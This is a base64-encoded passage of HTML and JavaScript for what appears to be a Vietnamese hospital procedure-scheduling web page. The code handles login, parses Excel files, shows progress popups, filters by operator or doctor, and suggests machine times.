ob3VycyAqIDM2MDAgKyBtaW51dGVzICogNjAgKyBzZWNvbmRzOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtaW51dGVzSW5EYXkgPSBob3VycyAqIDYwICsgbWludXRlczsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHJldHVybiB7DQogICAgICAgICAgICAgICAgICAgICAgICBkYXRlT2JqLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZUtleTogYCR7ZGF5fS8ke21vbnRofS8ke3llYXJ9YCwNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXM6IG1pbnV0ZXNJbkRheSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHM6IHNlY29uZHNJbkRheSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlUaW1lOiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7c2Vjb25kcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YA0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ8SQ4buLbmggZOG6oW5nIHRo4budaSBnaWFuIGtow7RuZyDEkcaw4bujYyBo4buXIHRy4bujJyk7DQogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgICAgIGxvZ0Vycm9yKGBM4buXaSBwaMOibiB0w61jaCB0aOG7nWkgZ2lhbjogJHtlcnJvci5tZXNzYWdlfWAsIHJvd0luZGV4LCB7IA0KICAgICAgICAgICAgICAgICAgICB2YWx1ZTogZGF0ZXRpbWVTdHIsDQogICAgICAgICAgICAgICAgICAgIGVycm9yRGV0YWlsczogZXJyb3Iuc3RhY2sgDQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLyA9PT09PT09PT09IEtI4bueSSBU4bqgTyBT4buwIEtJ4buGTiA9PT09PT09PT09IC8vDQogICAgICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBmdW5jdGlvbigpIHsNCgkJbG9hZERhcmtNb2RlUHJlZmVyZW5jZSgpOw0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpLmZvY3VzKCk7DQogICAgICAgICAgICAvLyBLaGkgdHJhbmcgbG9hZA0KICAgICAgICAgICAgaWYgKCFzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJykpIHsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC5hZGQoJ2xvZ2luLXBhZ2UnKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gS2nhu4NtIHRyYSDEkcSDbmcgbmjhuq1wIGtoaSB0cmFuZyB04bqjaQ0KCQkNCgkJCQ0KICAgICAgICAgICAgY2hlY2tTYXZlZExvZ2luKCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIG7DunQgxJHEg25nIG5o4bqtcA0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luQnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgaXNMb2dpbkFjdGlvbiA9IHRydWU7IC8vIOKchSBUaMOqbSBkw7JuZyBuw6B5DQogICAgY2hlY2tMb2dpbigpOw0KfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIG7DunQgxJHEg25nIHh14bqldA0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ291dEJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGlzTG9naW5BY3Rpb24gPSBmYWxzZTsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCiAgICBsb2dvdXQoKTsNCn0pOw0KDQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIMSQxINuZyBuaOG6rXAgYuG6sW5nIHBow61tIEVudGVyDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICAgICAgICAgICAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICAgICAgICAgICAgICAgIGNoZWNrTG9naW4oKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gbsO6dCBwaMOibiB0w61jaCBmaWxlDQogICAgICAgICAgICANCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBhc3luYyAoKSA9PiB7DQogIGF3YWl0IGVuc3VyZVhMU1goKTsgLy8gbuG6oXAgWExTWCDEkcO6bmcgbMO6YyBkw7luZw0KICAgIGNvbnN0IGZpbGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0JykuZmlsZXNbMF07DQppZiAoIWZpbGUpIHsNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSBgDQogICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxzdHJvbmc+VnVpIGzDsm5nIGNo4buNbiBmaWxlIHRyxrDhu5tjIGtoaSBraeG7g20gdHJhPC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKS5zdHlsZS5kaXNwbGF5PSdub25lJyI+xJDDs25nPC9idXR0b24+DQogICAgYDsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgcmV0dXJuOw0KfQ0KDQoNCiAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93JykpOw0KDQogICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtcGFwZXItcGxhbmUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojMzQ5OGRiO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPsSQYW5nIGfhu61pIGThu68gbGnhu4d1IHbhu4EgbcOheSBjaOG7py4uLic7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMzMlJzsNCgkNCgkNCgkNCgljb25zdCBwcm9ncmVzc0JhckNvbnRhaW5lciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhckNvbnRhaW5lcicpOw0KDQovLyBDaOG7iSB04bqhbyAxIGzhuqduDQppZiAoIWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjcmVkaXRMaW5lQmVsb3cnKSkgew0KICBjb25zdCBjcmVkaXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgY3JlZGl0LmlkID0gJ2NyZWRpdExpbmVCZWxvdyc7DQogIGNyZWRpdC5pbm5lclRleHQgPSAnwqkgVGhp4bq/dCBr4bq/ICYgcGjDoXQgdHJp4buDbiBi4bufaSBEci4gQ2jDonUnOw0KICBjcmVkaXQuc3R5bGUubWFyZ2luVG9wID0gJzEwcHgnOw0KICBjcmVkaXQuc3R5bGUuZm9udFNpemUgPSAnMTZweCc7DQogIGNyZWRpdC5zdHlsZS5jb2xvciA9ICcjRkYwMDAwJzsNCiAgY3JlZGl0LnN0eWxlLnRleHRBbGlnbiA9ICdjZW50ZXInOw0KDQogIHByb2dyZXNzQmFyQ29udGFpbmVyLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGNyZWRpdCwgcHJvZ3Jlc3NCYXJDb250YWluZXIubmV4dFNpYmxpbmcpOw0KfQ0KCQ0KCQ0KCQ0KCQ0KICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgNTApKSk7DQogICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDcwMCkpOw0KDQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnNjYlJzsNCg0KICAgIGxldCB0b3RhbCA9IDA7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgZmlsZVJlYWRlciA9IG5ldyBGaWxlUmVhZGVyKCk7DQogICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7DQogICAgICAgICAgICBmaWxlUmVhZGVyLm9ubG9hZCA9IGUgPT4gcmVzb2x2ZShuZXcgVWludDhBcnJheShlLnRhcmdldC5yZXN1bHQpKTsNCiAgICAgICAgICAgIGZpbGVSZWFkZXIub25lcnJvciA9ICgpID0+IHJlamVjdChuZXcgRXJyb3IoIkzhu5dpIMSR4buNYyBmaWxlIikpOw0KICAgICAgICAgICAgZmlsZVJlYWRlci5yZWFkQXNBcnJheUJ1ZmZlcihmaWxlKTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3Qgd29ya2Jvb2sgPSBYTFNYLnJlYWQoZGF0YSwgeyB0eXBlOiAnYXJyYXknIH0pOw0KICAgICAgICBjb25zdCBmaXJzdFNoZWV0ID0gd29ya2Jvb2suU2hlZXRzW3dvcmtib29rLlNoZWV0TmFtZXNbMV1dOw0KICAgICAgICBjb25zdCBqc29uRGF0YSA9IFhMU1gudXRpbHMuc2hlZXRfdG9fanNvbihmaXJzdFNoZWV0LCB7DQogICAgICAgICAgICBoZWFkZXI6IDEsDQogICAgICAgICAgICBkZWZ2YWw6ICIiLA0KICAgICAgICAgICAgYmxhbmtyb3dzOiB0cnVlDQogICAgICAgIH0pOw0KDQogICAgICAgIGNvbnN0IHJvd3MgPSBqc29uRGF0YS5zbGljZSg5KTsNCiAgICAgICAgdG90YWwgPSByb3dzLmxlbmd0aDsNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdG90YWwgPSAxMDAwOw0KICAgIH0NCg0KICAgIGNvbnN0IHN0ZXAgPSAxMDA7DQogICAgY29uc3Qgc3RlcHMgPSBNYXRoLmNlaWwodG90YWwgLyBzdGVwKTsNCiAgICBjb25zdCBpbnRlcnZhbCA9IDI2MDAgLyBzdGVwczsNCg0KICAgIGZvciAobGV0IGkgPSAxOyBpIDw9IHN0ZXBzOyBpKyspIHsNCiAgICAgICAgY29uc3QgY3VycmVudCA9IE1hdGgubWluKGkgKiBzdGVwLCB0b3RhbCk7DQogICAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojMjk4MGI5O21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPsSQYW5nIHBow6JuIHTDrWNoIGThu68gbGnhu4d1IHThu6tuZyBi4buHbmggbmjDom4uLi48YnI+JyArIGN1cnJlbnQgKyAnIC8gJyArIHRvdGFsOw0KICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgaW50ZXJ2YWwpKTsNCiAgICB9DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1jaGVjay1jaXJjbGUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpncmVlbjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz7EkMOjIGtp4buDbSB0cmEgeG9uZy4uLic7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMTAwJSc7DQogICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDEwMDApKTsNCg0KaWYgKCF3aW5kb3cuaXNLaG9hTG9pKSB7DQogICAgcG9wdXAuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOw0KICAgIHNldFRpbWVvdXQoKCkgPT4geyBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyB9LCA1MDApOw0KDQoNCn0NCg0KDQoNCiBlbHNlIHsNCiAgICAvLyBO4bq/dSDEkWFuZyBs4buXaSBLaG9hLCBLSMOUTkcgxJHGsOG7o2Mg4bqpbiBwb3B1cA0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KfQ0KICAgIGhhbmRsZUZpbGUoKTsNCgkNCgkNCgkNCgkNCnNldFRpbWVvdXQoKCkgPT4gew0KICAgIC8vIOKdjCBO4bq/dSDEkWFuZyBs4buXaSB0w6puIGtob2EgdGjDrCBnaeG7ryBuZ3V5w6puIHBvcHVwLCBLSMOUTkcgxJHGsOG7o2Mg4bqpbiwgS0jDlE5HIGhp4buHbiBuw7p0DQogICAgaWYgKHdpbmRvdy5pc0tob2FMb2kpIHsNCiAgICAgICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICAgICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8g4pyFIE7hur91IGtow7RuZyBs4buXaSwgdGjDrCDhuqluIHBvcHVwIHbDoCBoaeG7h24gbsO6dCBjaOG7qWMgbsSDbmcNCiAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCg0KICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbi5idG4nKS5mb3JFYWNoKGJ0biA9PiB7DQogICAgICAgICBpZiAoYnRuLnRleHRDb250ZW50LmluY2x1ZGVzKCdHaeG7nSB0cuG7kW5nJykgfHwgDQogICAgICAgICAgICAgICAgYnRuLnRleHRDb250ZW50LmluY2x1ZGVzKCdT4bqvYyB0aHXhu5FjIHRoYW5nJykgfHwNCiAgICAgICAgICAgICAgICBidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ0Rhbmggc8OhY2ggYuG7h25oIG5ow6JuJykpIHsNCiAgICAgICAgICAgICAgICBidG4uc3R5bGUuZGlzcGxheSA9ICdpbmxpbmUtYmxvY2snOw0KICAgICAgICB9DQogICAgfSk7DQp9LCA1MDApOw0KDQoNCgkNCgkNCgkgICAgLy8gQ+G6rXAgbmjhuq10IGfhu6NpIMO9IGtoaSB0aGF5IMSR4buVaSB0w7l5IGNo4buNbiB0aOG7nWkgZ2lhbg0KIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXScpLmZvckVhY2gocmFkaW8gPT4gew0KICAgICAgICByYWRpby5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgIGlmIChtYWNoaW5lQ29uZmxpY3RMb2cgJiYgbWFjaGluZUNvbmZsaWN0TG9nLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgICAgICBnZW5lcmF0ZU1hY2hpbmVUaW1lU3VnZ2VzdGlvbnMoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSk7DQogICAgfSk7DQoNCiAgICAvLyBD4bqtcCBuaOG6rXQgZ+G7o2kgw70ga2hpIHRoYXkgxJHhu5VpIHPhu5EgbMaw4bujbmcga2h1bmcgZ2nhu50NCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgICAgIGlmIChtYWNoaW5lQ29uZmxpY3RMb2cgJiYgbWFjaGluZUNvbmZsaWN0TG9nLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIGdlbmVyYXRlTWFjaGluZVRpbWVTdWdnZXN0aW9ucygpOw0KICAgICAgICB9DQogICAgfSk7DQoJDQoJDQp9KTsNCg0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBkcm9wZG93biBs4buNYw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyQnlPcGVyYXRvcik7DQogICAgICAgICAgICANCgkJCQ0KCQkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlckJ5T3BlcmF0b3IpOw0KCQkJDQoJCQkNCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIHJhZGlvIGJ1dHRvbiBjaOG7jW4ga2h1bmcgZ2nhu50NCiAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXScpLmZvckVhY2gocmFkaW8gPT4gew0KICAgICAgICAgICAgICAgIHJhZGlvLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoYWxsUHJvY2VkdXJlcy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhhbGxQcm9jZWR1cmVzKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfSk7DQoJCQkNCgkJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCn0pOw0KDQogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAvLyBjaOG7iSByZW5kZXIgbOG6oWksIEtIw5RORyDEkeG7pW5nIGRyb3Bkb3duIGLDqm4ga2lhDQogICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogfSk7DQoJCQkNCiAgICAgICAgfSk7DQogICAgPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJwcm9jZWR1cmUtaW5mbyI+PGNlbnRlcj4gDQpEZXNpZ24gQnkgPGEgaHJlZj0iaHR0cDovL2ZiLmNvbS9jaGF1aHV5bmgwMTA0IiB0YXJnZXQ9Il9ibGFuayI+IERyLkNow6J1PC9hPjxici8+DQogICAgICAgICAgICAgICAgTuG6v3UgQ8OzIELhuqV0IEvhu7MgVsaw4bubbmcgTeG6r2MgR8OsIFZ1aSBMw7JuZyBMSCA6IDxici8+DQogICAgICAgICAgICAgICAgRW1haWw6IGNoYXVodXluaDAxMDRAZ21haWwuY29tPGJyLz4NCiAgICAgICAgICAgICAgICBTRFQ6IDA3OS41NjcuOTM1MDwvY2VudGVyPg0KPC9kaXY+DQoNCg0KDQo8c2NyaXB0Pg0KICAvLyBI4buXIHRy4bujIG5o4bqlbiBFbnRlciB04burIMO0IHVzZXJuYW1lIGhv4bq3YyBwYXNzd29yZA0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmZvY3VzKCk7DQogICAgfQ0KICB9KTsNCg0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5jbGljaygpOw0KICAgIH0NCiAgfSk7DQoNCi8vID09PT09PSBU4buwIMSQ4buYTkcgUVXDiVQgVEjGryBN4bukQyAmIENI4buMTiBGSUxFIE3hu5pJIE5I4bqkVCA9PT09PT0NCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlckJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmb2xkZXJJbnB1dCcpLmNsaWNrKCk7DQp9KTsNCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlcklucHV0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgYXN5bmMgKGUpID0+IHsNCiBhd2FpdCBlbnN1cmVYTFNYKCk7IC8vIG7huqFwIFhMU1ggdHLGsOG7m2Mga2hpIMSR4buNYyB3b3JrYm9vaw0KICAgIGNvbnN0IGZpbGVzID0gQXJyYXkuZnJvbShlLnRhcmdldC5maWxlcykuZmlsdGVyKGYgPT4gL1wuKHhsc3h8eGxzfGNzdikkL2kudGVzdChmLm5hbWUpKTsNCiAgICBjb25zdCBzdGF0dXNEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpOw0KICAgIGNvbnN0IGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKTsNCg0KICAgIGlmIChmaWxlcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJ3JlZCc7DQogICAgICAgIHN0YXR1c0Rpdi5pbm5lckhUTUwgPSAnS2jDtG5nIHTDrG0gdGjhuqV5IGZpbGUgRXhjZWwgaOG7o3AgbOG7hyB0cm9uZyB0aMawIG3hu6VjLic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBsZXQgdmFsaWRGaWxlID0gbnVsbDsNCg0KICAgIGZvciAoY29uc3QgZmlsZSBvZiBmaWxlcy5zb3J0KChhLCBiKSA9PiBiLmxhc3RNb2RpZmllZCAtIGEubGFzdE1vZGlmaWVkKSkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IGZpbGUuYXJyYXlCdWZmZXIoKTsNCiAgICAgICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCg0KICAgICAgICAgICAgaWYgKCF3b3JrYm9vay5TaGVldE5hbWVzWzFdKSBjb250aW51ZTsgLy8gY+G6p24gU2hlZXQgdGjhu6kgMg0KDQogICAgICAgICAgICBjb25zdCBzaGVldCA9IHdvcmtib29rLlNoZWV0c1t3b3JrYm9vay5TaGVldE5hbWVzWzFdXTsNCiAgICAgICAgICAgIGNvbnN0IGpzb25EYXRhID0gWExTWC51dGlscy5zaGVldF90b19qc29uKHNoZWV0LCB7IGhlYWRlcjogMSwgZGVmdmFsOiAiIiwgYmxhbmtyb3dzOiB0cnVlIH0pOw0KDQogICAgICAgICAgICBpZiAoanNvbkRhdGEubGVuZ3RoID49IDEwKSB7IC8vIMOtdCBuaOG6pXQgMiBkw7JuZyBoZWFkZXIgdsOgIGPDsyBk4buvIGxp4buHdSBkw7JuZyAxMA0KICAgICAgICAgICAgICAgIHZhbGlkRmlsZSA9IGZpbGU7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kgxJHhu41jIGZpbGUgJHtmaWxlLm5hbWV9OmAsIGVycik7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAodmFsaWRGaWxlKSB7DQogICAgICAgIGNvbnN0IGR0ID0gbmV3IERhdGFUcmFuc2ZlcigpOw0KICAgICAgICBkdC5pdGVtcy5hZGQodmFsaWRGaWxlKTsNCiAgICAgICAgZmlsZUlucHV0LmZpbGVzID0gZHQuZmlsZXM7DQoNCiAgICAgICAgLy8gY+G6rXAgbmjhuq10IHRy4bqhbmcgdGjDoWkNCiAgICAgICAgc3RhdHVzRGl2LmlubmVySFRNTCA9IGA8aSBjbGFzcz0iZmFzIGZhLWZvbGRlci1vcGVuIj48L2k+IMSQw6MgY2jhu41uIGZpbGU6IDxiPiR7dmFsaWRGaWxlLm5hbWV9PC9iPmA7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJyMyYzNlNTAnOw0KDQogICAgICAgIC8vIEfhu41pIGtp4buDbSB0cmENCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKS5jbGljaygpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5jb2xvciA9ICdyZWQnOw0KICAgICAgICBzdGF0dXNEaXYuaW5uZXJIVE1MID0gJ0tow7RuZyB0w6xtIMSRxrDhu6NjIGZpbGUgY8OzIGPhuqV1IHRyw7pjIGjhu6NwIGzhu4cuIFZ1aSBsw7JuZyBraeG7g20gdHJhIGzhuqFpLic7DQogICAgfQ0KfSk7DQoNCg0KPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJ0b2FzdCIgaWQ9InRvYXN0Ij48L2Rpdj4NCjwhLS0gUG9wdXAgbG9hZGluZyAtLT4NCjxkaXYgaWQ9ImxvYWRpbmdQb3B1cCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTt6LWluZGV4Ojk5OTk7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6J0ludGVyJyxzYW5zLXNlcmlmIj4NCjxkaXYgc3R5bGU9ImJhY2tncm91bmQ6I2ZmZjtwYWRkaW5nOjMwcHggNDBweDtib3JkZXItcmFkaXVzOjEwcHg7dGV4dC1hbGlnbjpjZW50ZXI7Ym94LXNoYWRvdzowIDAgMTVweCByZ2JhKDAsMCwwLDAuMyk7bWF4LXdpZHRoOjkwJTtmb250LXNpe